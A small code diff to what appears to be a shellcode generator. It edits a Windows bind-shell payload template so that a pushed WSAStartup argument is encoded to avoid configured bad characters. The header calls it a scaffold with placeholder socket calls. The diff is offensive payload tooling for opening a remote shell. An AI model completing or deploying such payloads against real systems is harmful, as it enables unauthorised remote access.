@@ -9,6 +9,7 @@ NOTE: This is a scaffold. bind/listen/accept calls are placeholders.
 from __future__ import annotations
 
 from .base import PayloadTemplate, TemplateConfig
+from ..encode import safe_push_word_as_dword
 
 
 class BindShellTemplate(PayloadTemplate):
@@ -39,7 +40,7 @@ class BindShellTemplate(PayloadTemplate):
             "    ; WSAStartup(0x0202, &WSADATA)",
             f"    lea  esi, {wsadata}",
             "    push esi",
-            "    push 0x0202",
+            *safe_push_word_as_dword(0x0202, config.badchars),
             f"    call dword ptr {wsa_start}",
             "",
             "    ; WSASocketA — create bind socket",
